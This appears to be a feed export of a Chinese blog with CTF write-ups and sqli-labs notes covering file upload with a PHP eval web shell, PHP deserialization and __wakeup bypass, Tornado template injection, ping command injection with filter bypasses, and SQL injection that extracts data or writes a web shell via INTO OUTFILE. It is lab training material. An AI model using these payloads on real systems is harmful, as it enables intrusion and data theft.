    <content type="html"><![CDATA[<h2 id="十二、"><a href="#十二、" class="headerlink" title="十二、"></a>十二、</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>[极客大挑战 2019]Upload<br><img src="https://ftp.bmp.ovh/imgs/2021/01/6d2e2b3ae0376852.png">         </p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>文件上传，先上个<code>.jpg</code><img src="https://ftp.bmp.ovh/imgs/2021/01/e24a1953387decc7.png"><br>???<br>应该是<code>Content-Type</code>吧，抓包是这样<code>Content-Type: image/jpeg</code>改了后缀后还是<code>not image</code>????<br>传个<code>.php</code>顺便改下<code>Content-Type</code><img src="https://ftp.bmp.ovh/imgs/2021/01/f243cb9e7e51afb6.png"><br>看来会检查后缀名；将<code>.php</code>改为<code>.jpg</code><img src="https://ftp.bmp.ovh/imgs/2021/01/cebf65b0f76244c3.png"><br>说明不能有<code>&lt;?</code><br>后缀改为<code>.phtml</code>，内容改为<code>&lt;script language=&quot;php&quot;&gt;eval($_POST[&#39;shell&#39;]);&lt;/script&gt; </code><img src="https://ftp.bmp.ovh/imgs/2021/01/989505f00c710eb4.png"><br>加上<code>GIF89a</code>成功上传<br>蚁剑连接          </p><h3 id="解"><a href="#解" class="headerlink" title="解"></a>解</h3><p>至于连接的路径，看别人的wp都说猜的<code>/upload/文件名</code><br><code>..........................</code><br><img src="https://ftp.bmp.ovh/imgs/2021/01/5f8ff088e106744f.png"><br>在根目录发现flag<br><img src="https://ftp.bmp.ovh/imgs/2021/01/85fc0fdb7ecda9f9.png">       </p><h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><blockquote><p><code>phtml</code>:嵌入PHP脚本的html，使用phtml作为后缀名<br>完全是PHP写的，用php作为后缀名<br><code>GIF89a</code>:GIF就是GIF文件的标识；89a是版本号，还有87a<br>图片头文件欺骗      </p></blockquote><blockquote><p><code>&lt;script language=&quot;php&quot;&gt;eval($_POST[&#39;shell&#39;]);&lt;/script&gt; </code>     </p></blockquote>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUU每日一题011</title>
    <link href="/2021/01/25/BUU011/"/>
    <url>/2021/01/25/BUU011/</url>
    
    <content type="html"><![CDATA[<h2 id="十一、"><a href="#十一、" class="headerlink" title="十一、"></a>十一、</h2><h3 id="题目：-极客大挑战-2019-PHP"><a href="#题目：-极客大挑战-2019-PHP" class="headerlink" title="题目：[极客大挑战 2019]PHP"></a>题目：[极客大挑战 2019]PHP</h3><p><img src="https://ftp.bmp.ovh/imgs/2021/01/c09882d30a32c90f.png">         </p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>网页提示说备份网站，用御剑扫，没扫出来<br>换为<code>dirsearch</code>扫出来一个<code>www.zip</code><img src="https://ftp.bmp.ovh/imgs/2021/01/96633462d343eda9.png"><br>加到url后面<code>http://63f0b170-4c01-4aa2-9608-5d33d689c712.node3.buuoj.cn/www.zip</code>得到一个压缩包，内有五个文件<br>主要内容：<br><code>index.php</code> :    </p><pre><code><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>                 <span class="token keyword">include</span> <span class="token single-quoted-string string">'class.php'</span><span class="token punctuation">;</span>              <span class="token variable">$select</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'select'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>              <span class="token variable">$res</span><span class="token operator">=</span><span class="token function">unserialize</span><span class="token punctuation">(</span>@<span class="token variable">$select</span><span class="token punctuation">)</span><span class="token punctuation">;</span>               <span class="token delimiter important">?></span></span>        ```      GET select参数，反序列化          ``class.php``:     ```php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span> <span class="token single-quoted-string string">'flag.php'</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Name</span><span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'nonono'</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'yesyes'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span> <span class="token operator">=</span> <span class="token variable">$username</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span> <span class="token operator">=</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'guest'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span> <span class="token operator">!=</span> <span class="token number">100</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;/br>NO!!!hacker!!!&lt;/br>"</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token double-quoted-string string">"You name is: "</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;/br>"</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token double-quoted-string string">"You password is: "</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;/br>"</span><span class="token punctuation">;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span> <span class="token operator">===</span> <span class="token single-quoted-string string">'admin'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">global</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;/br>hello my friend~~&lt;/br>sorry i can't give you the flag!"</span><span class="token punctuation">;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span>        </code></pre></code></pre><p>username为admin；password为100时，输出flag<br>因为传入的select会经过反序列化，所以构造的参数应该经过序列化<br>一位大佬的源码：     </p><pre><code><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">Name</span><span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"yesyesyes"</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"nonono"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span><span class="token operator">=</span><span class="token variable">$username</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span><span class="token operator">=</span><span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Name</span><span class="token punctuation">(</span>@admin<span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//var_dump($a);</span><span class="token comment">//echo "&lt;br>";</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$b</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token comment">//输出序列化</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//输出url编码后的序列化</span><span class="token delimiter important">?></span></span>            </code></pre></code></pre><p>还需要绕过<code>_wakeup()</code>,将属性数改为3或者大于3的数字即可         </p><h3 id="解"><a href="#解" class="headerlink" title="解"></a>解</h3><p>payload：<code>?select=O%3A4%3A&quot;Name&quot;%3A4%3A&#123;s%3A14%3A&quot;%00Name%00username&quot;%3Bs%3A5%3A&quot;admin&quot;%3Bs%3A14%3A&quot;%00Name%00password&quot;%3Bi%3A100%3B&#125;</code><img src="https://ftp.bmp.ovh/imgs/2021/01/9362857e700a46b0.png">      </p><h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><p><strong>php序列化与反序列化</strong>          </p><blockquote><p>所有php里面的值都可以使用函数serialize()来返回一个包含字节流的字符串来表示。unserialize()函数能够重新把字符串变回php原来的值。 序列化一个对象将会保存对象的所有变量，但是不会保存对象的方法，只会保存类的名字。<br>本题中序列化后<code>O:4:&quot;Name&quot;:2:&#123;s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;i:100;&#125;</code>  O表示存储的对象（object类型）；4代表对象名称有四个字符，即name；2表示有两个值username和password；s代表string类型；14代表字符串长度；i代表int类型；数值为100。<br><strong>不同属性序列化后的格式</strong><br>private属性序列化的时候格式是 %00类名%00成员名 如testname （test-&gt;类名name-&gt;成员名）；比如本题中，<code>nameusername</code>是12个字母，但前面数字是14，就是因为name和username前面各有一个空字符，url编码为<code>%00</code>;php的<code>urlencode</code>函数可以将空字符编出。<br>protected属性序列化的时候格式是<code> %00*%00</code>成员名 如<code>*name </code>（name-&gt;成员名)<br><strong>魔法函数</strong><br><code>__construct</code> 当一个对象创建时自动调用<br><code>__destruct</code> 当对象被销毁时自动调用 (php绝大多数情况下会自动调用销毁对象)<br><code>__wakeup </code>使用**unserialse()**函数时会自动调用<br><strong>wakeup函数绕过</strong><br>wakeup()漏洞就是与整个属性个数值有关。当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过wakeup的执行。</p></blockquote><p><a href="https://blog.csdn.net/m0_46383107/article/details/109770976">MORE</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUU每日一题010</title>
    <link href="/2021/01/24/BUU010/"/>
    <url>/2021/01/24/BUU010/</url>
    
    <content type="html"><![CDATA[<h2 id="十、"><a href="#十、" class="headerlink" title="十、"></a>十、</h2><ul><li>题目：[极客大挑战 2019]Http<br>打开网页    <img src="https://ftp.bmp.ovh/imgs/2021/01/48773f6455d50f52.png"></li><li>解<br>在源码中发现<code>Secret.php</code><br><img src="https://ftp.bmp.ovh/imgs/2021/01/b363b77c699739bc.png"><br>burp抓包，加上<code>Referer:    https://www.Sycsecret.com</code>值得注意的是<code>:</code>和<code>https://www.Sycsecret.com</code>中间要有四个空格<br><img src="https://ftp.bmp.ovh/imgs/2021/01/458f225deefe3ba1.png"><br>提示要用<code>Syclover</code>访问，将firefox改为Syclover<br><img src="https://ftp.bmp.ovh/imgs/2021/01/aa2a208a708a3cd6.png"><br>要在本地才可访问，将IP地址改为<code>127.0.0.1</code><img src="https://ftp.bmp.ovh/imgs/2021/01/305c71705fdf6cee.png"><br>得到flag          </li><li>知识点<br>几个常见请求头       <blockquote><p><code>Referer</code>:告诉服务器我是从哪个页面链接过来的<br><code>X-Forwarded-For </code>:用来表示 HTTP 请求端真实 IP<br><code>User-Agent:Mozilla/...</code>告诉HTTP服务器， 客户端使用的操作系统和浏览器的名称和版本<br><code>Cookie</code>用来存储一些用户信息以便让服务器辨别用户身份的<br><code>Cache-Control:max-age=10</code> 是通知浏览器10秒之内不要烦我，自己从缓冲区中刷新<br><code>Content-Type</code>:告诉客户端，资源文件的类型，还有字符编码<br><code>Data</code>:服务端发送资源时的服务时间<br><code>Server</code>:服务器和相对应的版本<br><code>Connection</code>:keep-alive告诉客户端服务器的tcp连接是一个长连接            </p></blockquote></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUU009</title>
    <link href="/2021/01/23/BUU009/"/>
    <url>/2021/01/23/BUU009/</url>
    
    <content type="html"><![CDATA[<h2 id="九、"><a href="#九、" class="headerlink" title="九、"></a>九、</h2><ul><li>题目：[RoarCTF 2019]Easy Calc<br>打开靶场，一个简单的计算器，在源代码中发现一些东西<br><img src="https://ftp.bmp.ovh/imgs/2021/01/b4957385a1f70127.png"><br>WAF和calc.php,访问calca.php<br><img src="https://ftp.bmp.ovh/imgs/2021/01/f7627cb41a97cb9f.png"></li><li>分析<br>本来以为是个简单的命令执行，但是我错了，输入num的值，发现不能输入字母，只能是数字或者运算符，才会有回显，<code>WAF</code><br>看了别人的wp说num前加括号可以绕过<br>然后输入<code> num=system(chr(39).ls.chr(39))</code>什么也没有，看了下<code> num=phpinfo()</code>发现system和其他一些函数被禁了,使用scandir,过滤的字符可以用chr编码         </li><li>解<br><code> num=var_dump(scandir(chr(47)))</code><br><img src="https://ftp.bmp.ovh/imgs/2021/01/84d49bb08cefae0b.png"><br>打开f1agg：<code>? num=var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</code>得到flag<br><img src="https://ftp.bmp.ovh/imgs/2021/01/d884c9d3fdbf9cb9.png">                  </li><li>知识点         </li><li>*几个函数：**      <blockquote><p><code>scandir</code> — 列出指定路径中的文件和目录,返回一个数组<br><code>file_get_contents</code> — 将整个文件读入一个字符串<br><code>var_dump</code> — 打印变量的相关信息        </p></blockquote></li></ul><p><strong>WAF</strong>      </p><blockquote><p>Web Application Firewall<br>Web应用防火墙是通过执行一系列针对HTTP/HTTPS的安全策略来专门为Web应用提供保护的一款产品。         </p></blockquote><p><strong>PHP的字符串解析特性</strong>         </p><blockquote><p>PHP将查询字符串（在URL或正文中）转换为内部<code>$_GET</code>或的关联数组<code>$_POST</code>。例如：<code>/?foo=bar</code>变成<code>Array([foo] =&gt; &quot;bar&quot;)</code>。值得注意的是，查询字符串在解析的过程中会将某些字符删除或用下划线代替。例如，<code>/?%20news[id%00=42</code>会转换为<code>Array([news_id] =&gt; 42)</code>。<br>在本题中利用空格，变量<code>num</code>变成了<code>空格num</code>，WAF找不到num这个变量，也就不起作用了，而变量进入到PHP语句中，空格会被删除       </p></blockquote><p>另外，这道题还可以用http走私攻击，但搞不懂      </p><p><code>tbl</code></p>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Buu每日一题008</title>
    <link href="/2021/01/22/Buu008/"/>
    <url>/2021/01/22/Buu008/</url>
    
    <content type="html"><![CDATA[<h2 id="八、"><a href="#八、" class="headerlink" title="八、"></a>八、</h2><ul><li>题目：[护网杯 2018]easy_tornado<br><img src="https://ftp.bmp.ovh/imgs/2021/01/dda44cc856f68e99.png">        </li><li>分析<br>三个文件，打开后<img src="https://ftp.bmp.ovh/imgs/2021/01/a8795c859978059a.png"><br><img src="https://ftp.bmp.ovh/imgs/2021/01/f58ca7b8ec5ab046.png"><br><img src="https://ftp.bmp.ovh/imgs/2021/01/4611fedc253b2ebd.png"><br>第一个给了flag所在的文件<br>第二个render是渲染的意思，不知道有什么用<br>的三个hint是提示的意思<code>file?filename=/flag.txt&amp;filehash=3d518951e756f5b32ac20ed58cd605d6</code>提示的是后面filehash的加密方式吧，所以现在要找到cookie_secret了<br>其实一开始不知道这道题是什么意思，试图访问<br>fllllllllllllag，出现了报错的页面<img src="https://ftp.bmp.ovh/imgs/2021/01/7ccf51202666afbb.png"><br>url中的<code>msg=Error</code>和页面显示的一样，改成123的话页面也能跟着变，所以用这个得到cookie_secret，但不是直接访问，而是<code>error?msg=&#123;&#123;handler.settings&#125;&#125;</code><img src="https://ftp.bmp.ovh/imgs/2021/01/db67ed2001e1f9a1.png"><br>接下来按hint.txt中加密即可            </li><li>解<br>payload：<code> file?filename=/fllllllllllllag&amp;filehash=06d6f09671ddf3eb27de7e2ef86a5d05</code> 得到flag<img src="https://ftp.bmp.ovh/imgs/2021/01/c2696ad17fea66f3.png">    </li><li>知识点      </li><li>*tornado**       <blockquote><p>Tornado 是一个Python网络框架， 异步网络库，最初由 开发 FriendFeed 。 通过使用非阻塞网络I / O，Tornado 可以扩展到成千上万的开放连接，非常适合 长轮询 ， WebSockets 等 需要与每个用户保持长期连接的应用程序。       </p></blockquote></li></ul><blockquote><p>在tornado模板中，存在一些可以访问的快速对象,这里用到的是handler.settings，handler 指向RequestHandler，而RequestHandler.settings又指向self.application.settings，所以handler.settings就指向RequestHandler.application.settings了，这里面就是我们的一些环境变量              </p></blockquote><blockquote><p>看别人说这个叫做<strong>模板注入</strong><br>各种东西吧，看了一下午也不理解，哎  ,tbl<br><a href="https://www.tornadoweb.org/en/latest/guide/security.html?highlight=cookie_secret#cookies-and-secure-cookies">MORE</a>               </p></blockquote>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Level9</title>
    <link href="/2021/01/21/level9/"/>
    <url>/2021/01/21/level9/</url>
    
    <content type="html"><![CDATA[<h2 id="level9"><a href="#level9" class="headerlink" title="level9"></a>level9</h2><p>GET-Blind-Time based-Single-Quotes<br>基于时间的布尔盲注-单引号<br>两个函数：      </p><blockquote><p><code>sleep()</code>:延长语句运行时间，如：sleep(n)运行n秒<br><code>IF(expr,v1,v2)</code>:如果表达式 expr 成立，返回结果 v1；否则，返回结果 v2。</p></blockquote><p>level9中不论输入的语句正确与否，输出只有<code>You are in....</code>所以不能仅根据布尔盲注，布尔盲注需要两个返回，没有条件可以使用<code>IF(expr,v1,v2)</code>创造条件，只要将布尔语句填入到<code>expr</code>中即可。                  </p><ul><li>开始注入<br><code>?id=1&#39;and if(length(database())&gt;0,sleep(5),0)%23</code>如果数据库的长度大于0，延迟五秒，否则返回0<br><img src="https://ftp.bmp.ovh/imgs/2021/01/d79de8d29be38904.png"><br><code>?id=1&#39;and if(ascii(substr(database(),1,1))&gt;97,sleep(5),0)%23</code>库名的（第一个）字母<br><code>?id=1&#39;and if((select length(table_name) from information_schema.tables where table_schema=database() limit 0,1)&gt;0,sleep(5),0)%23</code>第一个表名的长度<br><code>.......................................................</code><br><code>.........................................</code><br><code>...................</code><br><a href="https://lll-nnn.github.io/2021/01/19/level5/">具体见</a> </li></ul><hr><h2 id="level10"><a href="#level10" class="headerlink" title="level10"></a>level10</h2><p>GET-Blind-Time based-double quotes<br>基于时间的盲注–双引号<br>相较于level9，单引号改为双引号<br>测试<code>?id=1&quot; and if(length(database())&gt;1,sleep(7),0)%23</code>正常延迟</p><hr><h2 id="Time"><a href="#Time" class="headerlink" title="Time"></a>Time</h2><p>如果遇到这样的题的话，因为不报错，只有一个回显，所以只能根据if语句看反应判断闭合方式。</p>]]></content>
    
    
    
    <tags>
      
      <tag>note</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Level7</title>
    <link href="/2021/01/21/level7/"/>
    <url>/2021/01/21/level7/</url>
    
    <content type="html"><![CDATA[<h2 id="level7"><a href="#level7" class="headerlink" title="level7"></a>level7</h2><p>GET-Dump into outfile-String<br>导出文件GET字符型注入     </p><ul><li><p>相关知识点      </p><blockquote><p>select into outfile命令作用将查询结果输出保存到一个文件中<br>写入一句话语句：<code>select “&lt;?php @eval($_POST[&#39;giantbranch&#39;]);?&gt;” into outfile “XXX\test.php”</code><br>需要知道绝对路径<br>需要在MySQL目录下的<code>my.in</code>文件中添加<code>secure_file_priv= &quot;&quot;</code>，然后重启mysql。<br><code>secure_file_priv=null</code>: 不允许csv文件的导入导出<br><code>secure_file_priv=xxx</code>: csv文件导入导出到某路径<br><code>secure_file_priv=/ </code>:csv文件可导入到任意路径        </p></blockquote></li><li><p>联系<br>将自己MySQL下的my.in修改后，重启，level7中输入<code>?id=-1&#39;))%20 union select 1,2,&#39;&lt;?php eval($_REQUEST[&quot;a&quot;]);?&gt;&#39; into outfile &quot;D:\\phpstudy_pro\\Extensions\\MySQL5.7.26\\data\\test.php&quot;%23</code>,在目录下产生了test.php<img src="https://ftp.bmp.ovh/imgs/2021/01/153f4103dc13dacc.png"><br>难受的是蚁剑连不上，不知道咋回事。。。。。。。。。。</p></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>note</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUU每日一题007</title>
    <link href="/2021/01/21/BUU007/"/>
    <url>/2021/01/21/BUU007/</url>
    
    <content type="html"><![CDATA[<h2 id="七、"><a href="#七、" class="headerlink" title="七、"></a>七、</h2><ul><li>题目：[ACTF2020 新生赛]Exec<br><img src="https://ftp.bmp.ovh/imgs/2021/01/3d1a38e39bff6cb0.png">    </li><li>分析<br>和昨天一样，又是一道ping的题目，<code>;ls</code>一下，发现一个<code>index.php</code>，再试一下<code>;ls -a</code>也没有flag相关的，这道题似乎没有什么过滤啊，查看根目录吧<code>ls /</code>,发现flag文件<img src="https://ftp.bmp.ovh/imgs/2021/01/9e0031abde862323.png"><br>之后cat得到flag。          </li><li>解<br><code>payload：cat /flag</code><img src="https://ftp.bmp.ovh/imgs/2021/01/455302e4fdf00d14.png"></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUU每日一题006</title>
    <link href="/2021/01/20/BUU006/"/>
    <url>/2021/01/20/BUU006/</url>
    
    <content type="html"><![CDATA[<h2 id="六、"><a href="#六、" class="headerlink" title="六、"></a>六、</h2><ul><li>题目：[GXYCTF2019]Ping Ping Ping<br><img src="https://ftp.bmp.ovh/imgs/2021/01/0e8930c04d1c8c22.png">   </li><li>分析<br>ls一下，得到可能含有flag的文件<br><img src="https://ftp.bmp.ovh/imgs/2021/01/9c0e86bdd2f60fbf.png"><br>ping的命令执行，经检验，空格和<code>flag</code>被过滤<br>空格可以用<code>$IFS</code>代替；flag可以用变量拼接绕过         </li><li>解     </li><li>*payload：**<code>/?ip=127.0.0.1;a=ag.php;b=fl;cat$IFS$b$a</code>得到flag<img src="https://ftp.bmp.ovh/imgs/2021/01/7d3e88cdfb0a1e8e.png"><br>另外<code>/?ip=127.0.0.1;cat$IFS`ls` </code>内联执行，反引号内的输出可以作为前面命令的输入，上面的<code>cat$IFS`ls```=</code> cat flag.php;cat index.php``得到：<img src="https://ftp.bmp.ovh/imgs/2021/01/404e14d9ad638b74.png">         </li><li>知识点<br>产生原因：      <blockquote><p>当应用需要调用一些外部程序去处理内容的情况下，就会用到一些 执行系统命令的函数。如果用户可以控制命令执行函数中的参数时， 就可以注入一些恶意的系统命令到正常命令，造成命令执行漏洞          </p></blockquote></li></ul><p>几个符号     </p><blockquote><p><code>;</code><br>多条命令执行<br><code>|</code><br>管道符，上一条命令的输出，作为下一条命令参数。ctf里面：ping 127.0.0.1 | ls(只执行ls不执行前面的）本题<code>?ip=127.0.0.1|ls</code>只会输出<code>flag.php  index.php</code><br><code>&amp;</code><br><code>?ip=127.0.0.1&amp;ls</code>先执行ls后执行ping，但在题中试了下，输出的是ping的结果？？？？？？<br><code>&amp;&amp;</code><br><code>?ip=127.0.0.1&amp;&amp;ls</code>ping命令正确才执行ls<br><code>||</code><br>与&amp;&amp;相反，逻辑或的功能       </p></blockquote><p>一些绕过       </p><blockquote><p>空格     </p><blockquote><p>{cat,flag.php}<br>${IFS}<br>$IFS$9<br>$IFS$1<br><code>&lt;</code><br><code>&lt;&gt;</code><br>\x20 </p></blockquote></blockquote><blockquote><p>内联执行     </p><blockquote><p>``cat$IFS`ls```               </p></blockquote></blockquote><p><a href="https://www.cnblogs.com/Tkitn/p/11661017.html">MORE</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Level5</title>
    <link href="/2021/01/19/level5/"/>
    <url>/2021/01/19/level5/</url>
    
    <content type="html"><![CDATA[<h2 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h2><ul><li><p>分析<br>GET-Double injection-Single Quotes-String<br>GET-双重注入-单引号-字符串<br>输入<code>?id=1</code>，输出为：<img src="https://s1.imagehub.cc/images/2021/01/19/01dc313d1d917e646e.png" alt="01dc313d1d917e646e.png"><br><code>?id=22</code>没有输出；<code>?id=1&#39;</code>报错；根据题目，应该用双重注入：一个select语句中再嵌套一个select语句，嵌套的这个语句称作子查询<br>，如<code>select concat((select database()));</code><br>几个函数：    </p><blockquote><p>count(expression)：     返回查询的记录总数，expression 参数是一个字段或者 * 号<br>rand()：返回0到1的随机数<br>floor(x)     返回小于或等于 x 的最大整数<br>group by语句：把结果分组输出<br>concat()：连接两条语句<br>重要语句：*<em>``id=1’ union SELECT null,count(</em>),concat((payload),floor(rand()*2))as a from information_schema.tables group by a%23<br>``**其中payload为sql语句      </p></blockquote></li><li><p>开始注入<br><code>?id=1&#39; union SELECT null,count(*),concat((select group_concat(schema_name) from information_schema.schemata ),floor(rand()*2))as a from information_schema.tables group by a%23</code>得到所有库名<img src="https://s1.imagehub.cc/images/2021/01/19/502.png" alt="502.png"><br><code>?id=1&#39; union SELECT null,count(*),concat((select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39; ),floor(rand()*2))as a from information_schema.tables group by a%23</code>得到security下的表<img src="https://s1.imagehub.cc/images/2021/01/19/503.png" alt="503.png">值得注意的是,最后一个表是users，1是rand生成拼接的。<br><code>?id=1&#39; union SELECT null,count(*),concat((select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39; ),floor(rand()*2))as a from information_schema.tables group by a%23</code>users下的列<img src="https://s1.imagehub.cc/images/2021/01/19/504.png" alt="504.png"><br><code>?id=1&#39; union SELECT null,count(*),concat((select group_concat(username,password) from security.users ),floor(rand()*2))as a from information_schema.tables group by a%23</code>查数据出现问题了，这段语句的输出是<code>You are in...........</code>不知道为什么，感觉没错啊，换成这样的<code>?id=1&#39; union SELECT null,count(*),concat((select username from security.users ),floor(rand()*2))as a from information_schema.tables group by a%23</code>,输出<code> Subquery returns more than 1 row</code>，再加上limit，一个一个查，得到所有的username和password。<br>这种方法有时候回车一次不会成功，得多注几次。      </p></li></ul><hr><hr><ul><li><strong>bool盲注</strong><br>几个函数        <blockquote><p>substr(s, start, length)     从字符串 s 的 start 位置截取长度为 length 的子字符串<br>Length（）函数 返回字符串的长度<br>ascii(s)     返回字符串 s 的第一个字符的 ASCII 码。          </p></blockquote></li></ul><p>正确时返回<code>You are in...</code>;错误时无返回<br><code>?id=1&#39; and length(database())&gt;8%23</code>无返回，7有返回，说明当前数据库的长度为8<br><code>?id=1&#39; and ascii(substr(database(),1,1))&gt;115%23</code>无返回,114有返回，说明库名第一个字母为s<br><code>?id=1&#39; and ascii(substr(database(),2,1))&gt;101%23</code>无返回，100有返回，说明第二个字母为e<br><code>.......................................................</code><br><code>.........................................</code><br><code>...................</code>            </p><p><code>?id=1&#39;and (select length(table_name) from information_schema.tables where table_schema=database() limit 0,1)&gt;6%23</code>判断（第一个）表的长度        </p><p><code>.......................................................</code><br><code>.........................................</code><br><code>...................</code><br><code>1&#39;and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))&gt;97%23</code>（第一个）表的（第一个）字符        </p><p><code>.......................................................</code><br><code>.........................................</code><br><code>...................</code><br><code>?id=1&#39;and (ascii(substr((select column_name from information_schema.columns where table_name=&#39;users&#39; limit 0,1),1,1)))&gt;65%23</code>（users）下（第一列）的（第一个）字符       </p><p><code>.......................................................</code><br><code>.........................................</code><br><code>...................</code><br><code>1&#39;and (ascii(substr((select username from security.users limit 0,1),1,1)))&gt;65%23</code>         </p><h2 id="level6"><a href="#level6" class="headerlink" title="level6"></a>level6</h2><p>GET-Double injection-Double 